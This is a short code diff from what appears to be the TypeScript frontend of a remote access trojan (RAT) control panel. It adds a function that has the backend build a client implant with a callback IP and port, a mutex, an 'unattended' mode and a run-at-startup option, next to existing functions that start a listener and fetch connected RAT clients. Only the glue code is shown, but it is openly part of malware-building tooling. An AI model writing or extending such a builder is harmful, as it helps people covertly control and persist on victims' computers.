@@ -5,6 +5,24 @@ export const startServerCmd = async (port: string): Promise<string> => {
   return invoke("start_server", { port });
 };
 
+export const buildClientCmd = async (
+  ip: string,
+  port: string,
+  unattended: boolean,
+  mutexEnabled: boolean,
+  mutex: string,
+  startup: boolean
+): Promise<void> => {
+  return invoke("build_client", {
+    ip,
+    port,
+    mutexEnabled,
+    mutex,
+    unattendedMode: unattended,
+    startup,
+  });
+};
+
 export const fetchClientsCmd = async (): Promise<RATClient[]> => {
   let clients: RATClient[] = await invoke("fetch_clients");
   return clients;
